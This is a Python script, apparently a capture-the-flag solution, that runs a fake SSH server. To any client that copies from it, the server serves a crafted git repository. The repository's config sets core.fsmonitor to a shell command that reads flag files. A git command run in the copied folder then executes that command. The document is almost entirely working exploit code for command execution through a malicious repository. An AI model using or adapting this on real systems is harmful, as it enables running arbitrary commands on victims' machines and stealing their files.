#!/bin/env python

'''
A dummy SSHD server that supports onlu scp -f * and SFTP.

This is not needed, you can simply add a password-protected account
to your existing SSH server and copy the other files there,
but this implementation seems to be more reliable than OpenSSH at least.

This script has many features that are not related to the task at all,
but were fun to experiment with.
'''

import socket
import struct
import stat
import threading
from io import BytesIO
from paramiko import (
    AUTH_FAILED,
    AUTH_SUCCESSFUL,
    OPEN_SUCCEEDED,
    RSAKey,
    ServerInterface,
    SFTP_OP_UNSUPPORTED,
    SFTP_NO_SUCH_FILE,
    SFTPAttributes,
    SFTPHandle,
    SFTPServer,
    SFTPServerInterface,
    Transport,
    Message,
)
from paramiko.sftp import CMD_EXTENDED, CMD_NAME, CMD_NAMES, CMD_INIT, CMD_VERSION, _VERSION
from paramiko.py3compat import (
    bytes_types,
    string_types,
)
import paramiko.transport
paramiko.transport.SERVER_DISABLED_BY_GENTOO = False

class MyServer(ServerInterface):
    def check_auth_password(self, username, password):
        print(f'check_auth_password({username=}, {password=})')
        if username == 'justctf-gitara' and password == 'hunter2':
            return AUTH_SUCCESSFUL
        return AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        print(f'check_channel_request({kind=}, {chanid=})')
        return OPEN_SUCCEEDED

    def check_channel_exec_request(self, channel, command):
        print(f'check_channel_exec_request({channel=}, {command=})')
        def job():
            print(repr(channel.recv(4096)))
            channel.sendall(b'''\
C0644 86 config
[core]
repositoryformatversion=0
worktree=.
fsmonitor=head /flag* >/proc/$PPID/fd/1 #
\0C0755 0 objects
\0C0755 0 refs
\0C0644 11 HEAD
ref: refs/
\0''')
            channel.send_exit_status(0)
            channel.shutdown_write()
            print(repr(channel.recv(4096)))
            channel.close()
        global thr
        thr = threading.Thread(target=job)
        thr.start()
        return True


class MySFTPServer(SFTPServer):
    #'''
    def _send_server_version(self):
        # winscp will freak out if the server sends version info before the
        # client finishes sending INIT.
        t, data = self._read_packet()
        if t != CMD_INIT:
            raise SFTPError("Incompatible sftp protocol")
        version = struct.unpack(">I", data[:4])[0]
        # advertise that we support "check-file"
        extension_pairs = ["check-file", "md5,sha1", "expand-path@openssh.com", "1"]
        msg = Message()
        msg.add_int(_VERSION)
        msg.add(*extension_pairs)
        self._send_packet(CMD_VERSION, msg)
        return version
        '#'''

    def _process(self, t, request_number, msg):
        print(f"_process({t=} ({CMD_NAMES[t]}), {request_number=}, {msg=})")
        if t == CMD_EXTENDED:
            tag = msg.get_text()
            if tag == "check-file":
                self._check_file(request_number, msg)
            elif tag == "expand-path@openssh.com":
                path = msg.get_text()
                resp = self.server.expand_path(path)
                if isinstance(resp, (bytes_types, string_types)):
                    self._response(
                        request_number, CMD_NAME, 1, resp, "", SFTPAttributes()
                    )
                else:
                    self._send_status(request_number, resp)
            elif tag == "posix-rename@openssh.com":
                oldpath = msg.get_text()
                newpath = msg.get_text()
                self._send_status(
                    request_number, self.server.posix_rename(oldpath, newpath)
                )
            else:
                print("unhandled ext cmd", tag)
                self._send_status(request_number, SFTP_OP_UNSUPPORTED)
        else:
            try:
                super()._process(t, request_number, msg)
            except Exception as e:
                print(e)


class MySFTP(SFTPServerInterface):
    def expand_path(self, path):
        print(f'expand_path({path=})')
        return 'mleko'

    def list_folder(self, path):
        print(f'check_channel_request({path=})')
        return filesystem

    def lstat(self, path):
        print(f'lstat({path=})')
        return fsmap.get(path, SFTP_NO_SUCH_FILE)

    def stat(self, path):
        print(f'stat({path=})')
        return fsmap.get(path, SFTP_NO_SUCH_FILE)

    def open(self, path, flags, mode):
        print(f'open({path=})')
        handle = SFTPHandle(flags)
        try:
            handle.readfile = BytesIO(fsmap[path].contents)
        except KeyError:
            return SFTP_NO_SUCH_FILE
        return handle


def file(name, contents=b'', perm=0o644, ft=stat.S_IFREG):
    attrs = SFTPAttributes()
    attrs.filename = name
    attrs.contents = contents
    attrs.st_mode = ft | perm
    return attrs


keypath = 'ssh_host_key'
filesystem = [
    file('HEAD', b'ref: refs/\n'),
    file('objects', perm=0o755),
    file('refs', perm=0o755),
    file('config', b'''\
[core]
repositoryformatversion=0
worktree=.
fsmonitor=head /flag* >/proc/$PPID/fd/1 #
'''),
]
fsmap = {f.filename: f for f in filesystem}


if __name__ == '__main__':
    s = socket.create_server(('', 22), family=socket.AF_INET6, dualstack_ipv6=True, reuse_port=True)
    print(f'Listening on {s.getsockname()}')
    while True:
        conn, peer = s.accept()
        print(f'Connection from {peer}')
        transport = Transport(conn)
        server = MyServer()
        try:
            key = RSAKey.from_private_key_file(keypath)
        except FileNotFoundError:
            key = RSAKey.generate(2048)
            key.write_private_key_file(keypath)
        transport.add_server_key(key)
        transport.set_subsystem_handler('sftp', MySFTPServer, MySFTP)
        transport.start_server(server=server)
